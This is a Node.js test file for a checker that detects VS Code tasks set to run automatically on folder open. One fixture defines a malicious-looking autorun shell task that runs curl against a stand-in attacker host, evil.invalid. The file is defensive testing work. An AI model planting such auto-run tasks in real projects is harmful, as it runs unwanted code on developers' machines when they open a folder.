// Copyright (c) 2026 Sub Rosa contributors
import assert from "node:assert/strict";
import { execFileSync } from "node:child_process";
import { mkdirSync, mkdtempSync, rmSync, writeFileSync } from "node:fs";
import { tmpdir } from "node:os";
import { dirname, join, resolve } from "node:path";
import { describe, it } from "node:test";
import { fileURLToPath } from "node:url";

import { scanVscodeTasks } from "./check-vscode-tasks.mjs";

const __dirname = dirname(fileURLToPath(import.meta.url));
const CHECKER = resolve(__dirname, "check-vscode-tasks.mjs");
const REPO_ROOT = resolve(__dirname, "..");

function runChecker(rootDir) {
  try {
    const stdout = execFileSync(process.execPath, [CHECKER, "--root", rootDir], {
      encoding: "utf8",
      stdio: ["ignore", "pipe", "pipe"],
    });
    return { code: 0, stdout, stderr: "" };
  } catch (err) {
    return {
      code: err.status ?? 1,
      stdout: String(err.stdout ?? ""),
      stderr: String(err.stderr ?? ""),
    };
  }
}

function createFixture(files) {
  const root = mkdtempSync(join(tmpdir(), "sub-rosa-vscode-tasks-"));
  for (const [relPath, content] of Object.entries(files)) {
    const full = join(root, relPath);
    mkdirSync(dirname(full), { recursive: true });
    writeFileSync(full, content, "utf8");
  }
  return root;
}

describe("check-vscode-tasks", () => {
  it("passes on the real repository", () => {
    const res = runChecker(REPO_ROOT);
    assert.equal(res.code, 0);
    assert.deepEqual(scanVscodeTasks(REPO_ROOT), []);
  });

  it("passes a normal manual task fixture", () => {
    const root = createFixture({
      ".vscode/tasks.json": JSON.stringify(
        {
          version: "2.0.0",
          tasks: [
            {
              label: "Typecheck",
              type: "shell",
              command: "pnpm web:typecheck",
              runOptions: { runOn: "default" },
            },
          ],
        },
        null,
        2,
      ),
    });

    try {
      const res = runChecker(root);
      assert.equal(res.code, 0);
      assert.match(res.stdout, /No VS Code tasks with automatic folderOpen/);
    } finally {
      rmSync(root, { recursive: true, force: true });
    }
  });

  it("fails when a fixture contains runOn: folderOpen and prints only the offending file path", () => {
    const secretMarker = "DO_NOT_PRINT_THIS_COMMAND_PAYLOAD_987654";
    const root = createFixture({
      ".vscode/tasks.json": `{
  // JSONC comment
  "version": "2.0.0",
  "tasks": [
    {
      "label": "autorun",
      "type": "shell",
      "command": "curl https://evil.invalid/${secretMarker}",
      "runOptions": {
        "runOn": "folderOpen"
      }
    }
  ]
}`,
    });

    try {
      const res = runChecker(root);
      assert.notEqual(res.code, 0, "checker must exit non-zero on folderOpen task");
      assert.equal(res.stdout.trim(), ".vscode/tasks.json");
      assert.ok(
        !res.stdout.includes(secretMarker) && !res.stderr.includes(secretMarker),
        "checker must not print task command or full file contents",
      );
    } finally {
      rmSync(root, { recursive: true, force: true });
    }
  });

  it("ignores commented-out runOn: folderOpen lines in JSONC", () => {
    const root = createFixture({
      ".vscode/tasks.json": `{
  "version": "2.0.0",
  "tasks": [
    {
      "label": "safe",
      "type": "shell",
      "command": "pnpm test"
      // "runOptions": { "runOn": "folderOpen" }
    }
  ]
}`,
    });

    try {
      const res = runChecker(root);
      assert.equal(res.code, 0);
    } finally {
      rmSync(root, { recursive: true, force: true });
    }
  });
});
